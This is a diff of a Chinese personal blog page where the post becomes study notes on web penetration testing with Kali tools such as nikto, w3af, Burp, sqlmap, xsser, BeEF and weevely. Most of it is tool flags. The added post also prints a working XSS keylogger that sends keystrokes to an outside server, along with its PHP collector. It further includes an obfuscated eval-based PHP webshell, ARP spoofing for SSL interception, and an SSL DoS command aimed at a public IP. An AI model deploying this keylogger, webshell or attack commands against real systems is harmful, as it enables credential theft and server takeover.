@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/28/WEB%E6%B8%97%E9%80%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">溢出思路</a>
+            <a href="/2020/04/28/WEB%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">WEB渗透</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-04-24 12:21:43" itemprop="dateCreated datePublished" datetime="2020-04-24T12:21:43+08:00">2020-04-24</time>
+              <time title="Created: 2020-04-28 22:08:49" itemprop="dateCreated datePublished" datetime="2020-04-28T22:08:49+08:00">2020-04-28</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-26 10:01:43" itemprop="dateModified" datetime="2020-04-26T10:01:43+08:00">2020-04-26</time>
+                <time title="Modified: 2020-05-08 13:06:01" itemprop="dateModified" datetime="2020-05-08T13:06:01+08:00">2020-05-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,74 +262,210 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="溢出其余思路"><a href="#溢出其余思路" class="headerlink" title="溢出其余思路"></a>溢出其余思路</h2><ol>
-<li>有的时候我们可能只能发送指定个数的溢出字符，比如说只有发送3000个a的时候我们才能控制EIP的指定内容。</li>
-<li>有的时候我们可能并不能修改很多字符，情况是我们在EIP后面的栈内容中只能写很少个数的内容，但是我们溢出肯定有很多代码，所以找到那段字节，这个值可能是存在eax/ebx/edi之类的寄存器存储的内存单元指向的地址的，我们可以修改他，然后使用jmp eax之类的命令跳转过去，当然我们还是要先将EIP跳到ESP，然后间接跳转。</li>
-<li>跳转的时候还可以使用call，但是记得要恢复堆栈平衡的。</li>
-<li>溢出的坏字符一定要先查询</li>
-</ol>
-<h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><ol>
-<li>Exploit-db</li>
-<li>SecurityFocus</li>
-<li>Searchsploit</li>
-</ol>
-<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><ol>
-<li><p>Linux：</p>
+          <h2 id="页面克隆"><a href="#页面克隆" class="headerlink" title="页面克隆"></a>页面克隆</h2><p>使用httrack这个工具可以进行克隆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# httrack</span><br><span class="line"></span><br><span class="line">Welcome to HTTrack Website Copier (Offline Browser) 3.49-2</span><br><span class="line">Copyright (C) 1998-2017 Xavier Roche and other contributors</span><br><span class="line">To see the option list, enter a blank line or try httrack --help</span><br><span class="line"></span><br><span class="line">Enter project name :test</span><br><span class="line"></span><br><span class="line">Base path (return&#x3D;&#x2F;root&#x2F;websites&#x2F;) :&#x2F;root&#x2F;桌面&#x2F;test        </span><br><span class="line"></span><br><span class="line">Enter URLs (separated by commas or blank spaces) :http:&#x2F;&#x2F;www.zrrg.com&#x2F;</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line">(enter)	1	Mirror Web Site(s)</span><br><span class="line">	2	Mirror Web Site(s) with Wizard</span><br><span class="line">	3	Just Get Files Indicated</span><br><span class="line">	4	Mirror ALL links in URLs (Multiple Mirror)</span><br><span class="line">	5	Test Links In URLs (Bookmark Test)</span><br><span class="line">	0	Quit</span><br><span class="line">: 2</span><br><span class="line"></span><br><span class="line">Proxy (return&#x3D;none) :</span><br><span class="line"></span><br><span class="line">You can define wildcards, like: -*.gif +www.*.com&#x2F;*.zip -*img_*.zip</span><br><span class="line">Wildcards (return&#x3D;none) :*</span><br><span class="line"></span><br><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, type help</span><br><span class="line">Additional options (return&#x3D;none) :</span><br><span class="line"></span><br><span class="line">---&gt; Wizard command line: httrack http:&#x2F;&#x2F;www.zrrg.com&#x2F; -W -O &quot;&#x2F;root&#x2F;桌面&#x2F;test&#x2F;test&quot;  -%v  *</span><br><span class="line"></span><br><span class="line">Ready to launch the mirror? (Y&#x2F;n) :Y</span><br><span class="line"></span><br><span class="line">WARNING! You are running this program as root!</span><br><span class="line">It might be a good idea to run as a different user</span><br><span class="line">Mirror launched on Tue, 28 Apr 2020 22:04:52 by HTTrack Website Copier&#x2F;3.49-2 [XR&amp;CO&#39;2014]</span><br><span class="line">mirroring http:&#x2F;&#x2F;www.zrrg.com&#x2F; * with the wizard help..</span><br></pre></td></tr></table></figure>
+<p>很简单，就是跟着向导进行设置，拷贝出来文件的目录。<br>还是对我们的目录探索有一定的帮助的。</p>
+<h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><p>基本语法：<code>nikto -host http://www.XXXX.com</code></p>
+<ul>
+<li>-ssl 指定使用HTTPS</li>
+<li>-evasion：使用躲避技术，可以用1-8个状态进行指定，类似-evasion 167</li>
+</ul>
+<p>还有许多交互的键。<br>v详细信息，空格是查看当前状态。</p>
+<p>修改配置文件：<code>vi /etc/nikto.conf</code><br>可以修改UA</p>
+<p>这个程序主要是检测服务器程序的漏洞的，比如说IIS之类的。</p>
+<h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>使用命令：<code>skipfish -o skipfish http://www.baidu.com</code></p>
 <ol>
-<li>netcat</li>
-<li>curl</li>
-<li>wget</li>
+<li>-I 指定路径中包含的字符串：-I github</li>
+<li>使用@指定一个txt文件</li>
+<li>-S 指定一个需要检测的额外的隐藏目录，skipfish自带了好多wl后缀的文件，这些就是可能是隐藏的文件。</li>
+<li>-W 就是可能在检测的时候我们获得一些隐藏目录，我们指定一个文件将其保存</li>
+<li>-X 存在指定字符串就不进行测试</li>
+<li>-K 对某个参数不进行测试</li>
+<li>-D 多指定一个域名（需要扫描网站中存在，存在的话呢我们就会对其进行扫描）</li>
+<li>-L 每秒并发个数</li>
+<li>-m IP扫描的并发数</li>
+<li>-C 附带cookie信息，-C “name=wker”</li>
 </ol>
-</li>
-<li><p>Windows：<br>nc反弹的shell并不是一个交互的shell，不能进一步使用太多功能。</p>
+<p><img src="img1.jpg" alt="skipfish"></p>
+<p>感觉这个小工具很一般，虽然是谷歌的。</p>
+<h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><p>个人感觉这个小工具牛逼一些。<br>很烦的是新版本的kali已经不自带了，安装很麻烦，并且我现在的git克隆到10%就RPC中断，等我换个网吧，所以现在勉强用老版本的吧。<br>使用<code>help</code>查看使用方法。<br><code>plugins</code>进入插件目录：<br><img src="img2.jpg" alt="plugins"><br>使用<code>list</code>进行查看，<code>list audit</code>查看检测模块。<br>然后使用类似：<code>audit all</code>,<code>audit xss</code>选择我们要使用的插件。<br>一般使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">audit all</span><br><span class="line">grep all</span><br><span class="line">crawl web_spider</span><br></pre></td></tr></table></figure>
+<p>w3af自带了许多配置好了的。<br>使用profiles进行查看，list查看已有的。<br>当然我们选择好我们自己的配置好了的之后，我们使用save_as进行保存。<code>save_as test</code><br>我们下次用的时候，我们只需要<code>use</code>就可以了。<br>设置http的一些信息，<code>http-settings</code>设置我们的一些全局信息。<br>使用<code>view</code>查看我们可以配置的。<br>一些信息都是比较简单的，例如：<code>set rand_user_agent True</code><br>使用<code>save</code>进行保存。<br>进入<code>target</code>命令，使用<code>set target http://192.168.209.130</code>设置我们要扫描的目标站点。</p>
+<p>使用<code>save_as test1</code>最后一次保存。</p>
+<p>-s参数可以执行w3af的脚本。</p>
+<p>身份验证：</p>
 <ol>
-<li>TFTP（UDP，不加密，没有身份验证）<ol>
-<li>XP，2003都是有的</li>
-<li>Win7、2008都需要单独添加</li>
-<li>但是一般会被防火墙过滤</li>
-<li>mkdir /tftp</li>
-<li>将要上传到文件复制到tftp中</li>
-<li>chown -R nobody /tftp</li>
-<li>atftpd –daemon –port 69 /tftp</li>
-<li>netstat -panu | grep 69</li>
-<li>上面的命令主要是判断是不是atftpd打开的69，如果不是说明chown需要再运行一次</li>
-<li>在shell中使用<code>tftp -i 192.168.209.130 get 在tftp中的文件</code></li>
-</ol>
-</li>
-<li>FTP进行下载<ol>
-<li><code>echo open 192.168.209.130 &gt; ftp.txt</code></li>
-<li><code>echo username &gt;&gt; ftp.txt</code></li>
-<li><code>echo password &gt;&gt; ftp.txt</code></li>
-<li><code>echo bin &gt;&gt; ftp.txt</code></li>
-<li><code>echo GET file.exe &gt;&gt; ftp.txt</code></li>
-<li><code>echo bye &gt;&gt; ftp.txt</code></li>
-<li>在shell中执行<code>ftp -s:ftp.txt</code></li>
-</ol>
-</li>
-<li>vbs通过http传输<ol>
-<li>使用echo输出</li>
-<li>然后本机开80，放木马</li>
-<li>对面下载（使用cscript）</li>
-</ol>
-</li>
-<li>使用POWERSHELL传输文件<ol>
-<li>编写脚本和vbs差不多</li>
-<li><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIneractive -NoProfile filename.ps1</code></li>
-</ol>
-</li>
-<li>使用Debug<ol>
-<li>使用压缩壳对木马进行压缩</li>
-<li>使用<code>exe2bat.exe nc.exe nc.txt</code>吧exe转换成文本的二进制文件</li>
-<li>然后在shell中执行echo的语句，记住最后两句不是</li>
-<li>他会在目标生成一个hex文件</li>
-<li>最后再使用他最后两句的第一句，使用Debug汇编会生成一个DLL</li>
-<li>然后使用最后一句改名DLL为执行程序</li>
-<li>这个方法不能大于64KB</li>
-</ol>
+<li>如果有HTTP验证的话呢我们需要加上，其实也就是在协议头有个base64的一个编码。</li>
+<li>NTLM身份验证，Windows集成身份认证，其实也就是对一个随机数加密，然后回传，进行比对。</li>
+<li>表单的身份验证，就是设置一下表单的信息，但是需要注意的是，不要带着cookie去访问logout这种的退出网页。</li>
+<li>cookie就是随着访问发送的cookie，w3af需要用到的是一个cookie文件，导出的cookie文件，在config导入。<ul>
+<li><img src="img3.jpg" alt="cookies设置"></li>
+<li>第二个的意思是代表是否是整个域都可以访问这个cookie，我们一般需要设置为TRUE，第四个是代表是否是安全链接的时候才会传输，一般是FALSE</li>
+</ul>
 </li>
 </ol>
-</li>
+<p>w3af也支持代理。<br><img src="img4.jpg" alt="代理"></p>
+<p>在配置中可以设置头文件。<br>截断代理爬网也是比较有意思的。</p>
+<p>目录的话呢还是可以导入的。</p>
+<p>当然支持漏洞的利用，将利用的工具（w3af左边栏上的）拖动到漏洞上就可以了。</p>
+<h2 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h2><p>起始的页面对话框问你是否要保存回话（也就是操作得到的结果）<br>支持代理的爬站。<br>支持FUZZ测试。<br>可以选择扫描的类型（安全，保护，默认，危险）<br><img src="img5.jpg" alt="mode"><br>可以设置session在session标签下面。</p>
+<p>支持截断修改数据。<br>支持对隐藏表单的显示。</p>
+<h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><ol>
+<li>可以讲不支持代理的程序进行代理，需要在代理那里设置invisible<br>抓到数据包之后，我们在历史里面点击我们需要修改的CSRF数据包，然后右击选择Engagement tools，然后选择CSRF，就可以生成一个表单了。</li>
 </ol>
+<p><img src="img6.jpg" alt="CSRF"></p>
+<p>有点多，不记录了，之前用的有点多了，也比较熟悉了。</p>
+<h2 id="SQlmap"><a href="#SQlmap" class="headerlink" title="SQlmap"></a>SQlmap</h2><ol>
+<li>-u 参数指定一个URL进行检测</li>
+<li>-p 参数检查指定参数</li>
+<li>–users 参数查询数据库的账号密码</li>
+<li>–banner 查看banner信息</li>
+<li>–dbs 查看数据库</li>
+<li>-a 参数查询所有东西</li>
+<li>-schema 查询数据库的结构</li>
+<li>-m 参数对文件列表中的URL进行扫描</li>
+<li>-r 参数对POST之类的方法进行检测</li>
+<li>-l 参数对burp的log文件进行扫描</li>
+<li>–force=ssl 对HTTPS进行检测</li>
+<li>-c 扫描配置文件</li>
+<li>–data= 指定提交的参数</li>
+<li>–param-del 指定参数分隔符</li>
+<li>–cookie 指定参数（需要level&gt;=2的时候才会检查cookie）</li>
+<li>–level 2 指定等级</li>
+<li>–random-agent 随机UA</li>
+<li>–user-agent 指定UA</li>
+<li>UA中的漏洞需要level等级大于3</li>
+<li>host头中的注入需要等级大于5</li>
+<li>–referer 指定来源，等级大于3才能检测</li>
+<li>–header 指定HTTP的一些键值（大小写敏感）</li>
+<li>–method=GET/POST 指定提交的参数</li>
+<li><code>--proxy=&quot;http://127.0.0.1:8080&quot;</code> 使用代理</li>
+<li>–ignore-proxy 忽略操作系统代理</li>
+<li>–delay 每次之后的延迟</li>
+<li>–timeout 超时时间</li>
+<li>–retries 超时重试次数</li>
+<li>–randomize 指定每次请求随机取值的参数值</li>
+<li>–scope 通过正则表达式筛选扫描对象（有的时候URL比较多，burp的log类似的）</li>
+<li>–safe-url / –safe-freq 按时发几个正常的请求</li>
+<li>–skip-urlencode 参数不进行URL编码</li>
+<li>–eval 执行指定的Python脚本在每次提交数据之前（主要用来对某个参数进行计算的）</li>
+<li>–predict-output 指定使用猜测模糊方式加快性能（根据特征表段字段）</li>
+<li>–keep-alive 使用长连接（其实就是HTTP是每次访问是独立的，每次都要连接，然而长连接就一次连接就可以了，与proxy参数不兼容）</li>
+<li>–null-connection 空连接（使用文件内容大小进行判断，适用于盲注）</li>
+<li>-o 参数是上面三个参数的集合</li>
+<li>–text-only 通过关键字进行判断页面是否正常（与上面的不兼容）</li>
+<li>–threads 指定并发数</li>
+<li>–skip 排除指定的扫描参数</li>
+<li>–dbms 指定数据库类型</li>
+<li>–os 指定操作系统</li>
+<li>–incaild-bignum / –invalid-logical 将参数进行无效化，默认是取负数，前面的是巨大的值，后面的是用AND进行无效（其实就是让前面查询失败，只显示后面的查询结果）</li>
+<li>–no-cast 将结果转换为字符串，并用刻个替换NULL结果（针对老版本mysql）</li>
+<li>–no-escape 关闭ASCII编码逃逸（就是不用ASCII代理原字符）</li>
+<li>–prefix 指定前缀</li>
+<li>–suffix 指定后缀</li>
+<li>–tamper 混淆脚本，例如（–tamper=”randomcase.py,hex2char.py”）</li>
+<li>–risk 指定危险等级</li>
+<li>–string / –not-string 指定字符串存在不存在判断为真 –regexp 使用正则 –code 使用响应码 –text-only 指定字符 –titles 指定标题</li>
+<li>–time-sec 指定时间盲注的时间</li>
+<li>–union-cols 指定查询的列</li>
+<li>–union-char 指定联合查询的空字符</li>
+<li>–second-order 指定结果显示的页面（配合二次注入）</li>
+<li>-f 数据库版本</li>
+<li>-b banner信息</li>
+<li>在特殊的位置进行注入用*代替（伪静态）</li>
+<li>–dbs 查看当前数据库的账号（-D）</li>
+<li>–current-xxx 查看当前的XXX</li>
+<li>–privileges -U xxx 查看数据库的权限</li>
+<li>–roles 查看角色</li>
+<li>–tables 查看表（-T）–exclude-sysdbs（排除系统的系统）</li>
+<li>–columns 查看字段（-C）</li>
+<li>–count 查看记录数目</li>
+<li>–schema 查看数据库的表结构</li>
+<li>–batch 选项使用默认的选项</li>
+<li>-v 显示详细程度的级别</li>
+<li>–start –stop 指定其实和结束的位置</li>
+<li>–sql-query “select from xxx” 执行SQL语句</li>
+<li>–common-tables 暴力破解表</li>
+<li>–common-colums 暴力破解列</li>
+<li>–file-read=”etc/passwd” 读文件（UDF）</li>
+<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php” 上传shell.php到目标的/ymp下面的shell.php</li>
+<li>–os-cmd id 执行操作系统的命令</li>
+<li>–sql-shell 获取SQL的shell</li>
+<li>–reg-read/add/del（读取/添加/删除）注册表（需要指定键值…等信息<code>--reg-key</code>）</li>
+<li>–charset 指定编码 –charset=GBK</li>
+<li>–flush-session 清除之前保存的缓存</li>
+<li>–fresh-queries 忽略缓存</li>
+<li>–hex 使用十六进制进行传输数据</li>
+<li>–check-waf 检查WAF</li>
+<li>-hpp 绕过部分的保护（通过?x=1&amp;y=1&amp;x=1）这个样子绕过（asp多一些）</li>
+<li>–identify-waf 检查waf比较彻底</li>
+</ol>
+<h2 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h2><p>有个坑，就是说你需要将测试的参数的值改为XSS</p>
+<ul>
+<li>-s 统计信息</li>
+<li>-v 详细信息</li>
+<li>–reverse-check 提交一个js，这个js可以连接xsser，如果xsser接收到连接表明有xss</li>
+<li>–heuristic 查看过滤的的字符<br>编码参数：</li>
+<li>–Str               Use method String.FromCharCode()</li>
+<li>–Une               Use Unescape() function</li>
+<li>–Mix               Mix String.FromCharCode() and Unescape()</li>
+<li>–Dec               Use Decimal encoding</li>
+<li>–Hex               Use Hexadecimal encoding</li>
+<li>–Hes               Use Hexadecimal encoding with semicolons</li>
+<li>–Dwo               Encode IP addresses with DWORD</li>
+<li>–Doo               Encode IP addresses with Octal</li>
+<li>–Cem=CEM           Set different ‘Character Encoding Mutations’<br>注入位置：</li>
+<li>–Coo               COO - Cross Site Scripting Cookie injection</li>
+<li>–Xsa               XSA - Cross Site Agent Scripting</li>
+<li>–Xsr               XSR - Cross Site Referer Scripting</li>
+<li>–Dcp               DCP - Data Control Protocol injections</li>
+<li>–Dom               DOM - Document Object Model injections</li>
+<li>–Ind               IND - HTTP Response Splitting Induced code</li>
+</ul>
+<p>用onClick类型的可以绕过一些</p>
+<p>xss键盘记录器：<br>js代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt = evt || <span class="built_in">window</span>.event</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">    <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        <span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key)</span><br><span class="line">        http.open(<span class="string">"POST"</span>,<span class="string">"http://192.168.209.1:8080/keylogger.php"</span>,<span class="literal">true</span>);</span><br><span class="line">        http.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">        http.send(<span class="string">"key="</span>+param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = $_POST[<span class="string">'key'</span>];</span><br><span class="line">$log = fopen(<span class="string">"keylog.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$key);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再生成一个<code>keylog.txt</code>，当别人加载js的时候我们就会接收到他的输入，放在<code>keylog.txt</code>里面。</p>
+<h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><p>启动就好，监听3000端口<br>指定的就是3000下的hook.js<br>自动监听操作，查看浏览器的版本信息。<br>Persistence类型是用来持久维护shell的，尽量来了shell就用一下。</p>
+<p>暂时记录这么多，之后再记录。</p>
+<h2 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h2><p>WeBaCoo将数据的传输放在了cookie里面。</p>
+<ul>
+<li>生成木马<code>webacoo -g -o webacoo.php</code></li>
+</ul>
+<p>生成类似的编码（就是套了个壳子，免杀的性质）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $b=strrev(<span class="string">"edoced_4"</span>.<span class="string">"6esab"</span>);<span class="keyword">eval</span>($b(str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "</span>))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>连接木马：<code>webacoo -t -u http://192.168.209.1/webacoo.php</code></li>
+<li><img src="img7.jpg" alt="webacoo"></li>
+</ul>
+<p>其他的参数比较简单，而且用处不是太大（除非被针对）。</p>
+<p>Weevely比较好用。<br>支持的功能很多，还支持密码。</p>
+<ul>
+<li>生成服务端：<code>weevely generate pass123 wee.php</code></li>
+<li>连接：<code>weevely http://19.168.209.1:8080/wee.php pass123</code></li>
+<li>连接上使用help查看模块命令</li>
+</ul>
+<p><img src="img8.jpg" alt="weevely"></p>
+<h2 id="SSL扫描"><a href="#SSL扫描" class="headerlink" title="SSL扫描"></a>SSL扫描</h2><p>识别加密算法：<code>openssl s_client -connect www.baidu.com:443</code><br><img src="img9.jpg" alt="openssl"><br>查看证书链。<br>连接SSL：<code>openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code><br>不安全的组合：<code>openssl ciphers -v &quot;NULL,EXPORE,LOW,DES&quot;</code><br><img src="img10.jpg" alt="unsafe"><br>扫描SSL直观信息：<code>sslscan --tlsall www.taobao.com:443</code><br><img src="img11.jpg" alt="SSL"><br>分析服务器证书详细数据：<code>sslscan -show-certificate --no-ciphersuites www.taobao.com:443</code><br>发现：<code>rsa_pkcs1_sha1</code>是不安全的<br>查看SSL漏洞：<code>sslyze --regular www.taobao.com:443</code><br><img src="img12.jpg" alt="SSL漏洞"></p>
+<p>在线检查：<code>www.ssllabs.com/ssltest</code></p>
+<p>生成证书：<code>openssl genrsa -out ca.key 2048</code><br>生成根证书：<code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code><br>交互：</p>
+<ol>
+<li>CN</li>
+<li>HaiKou</li>
+<li>HaiNan</li>
+<li>Alibab</li>
+<li>ALI</li>
+<li>ALIBABA</li>
+<li><code>3311736869@qq.com</code></li>
+</ol>
+<p><img src="img13.jpg" alt="crt"></p>
+<p>打开路由功能：<code>sysctl -w net.ipv4.ip_forward=1</code><br>其实实际上修改的就是<code>/proc/sys/net/ipv4/ip_forward</code>，默认是0我们改为了1。<br>重定向端口信息。<br><img src="img14.jpg" alt="iptables"><br>ARP欺骗<br><img src="img15.jpg" alt="arp欺骗"><br>接下来就是受害者登录，我们截取密码了。<br>只是访问的时候浏览器会弹出警告不安全。</p>
+<p>SSLDOS不太需要占带宽。<br>使用命令：<code>thc-ssl-dos 218.189.202.46 443 --accept</code></p>
 
       
     </div>
@@ -349,7 +485,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/116/">116</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/118/">118</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -416,18 +552,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">116</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
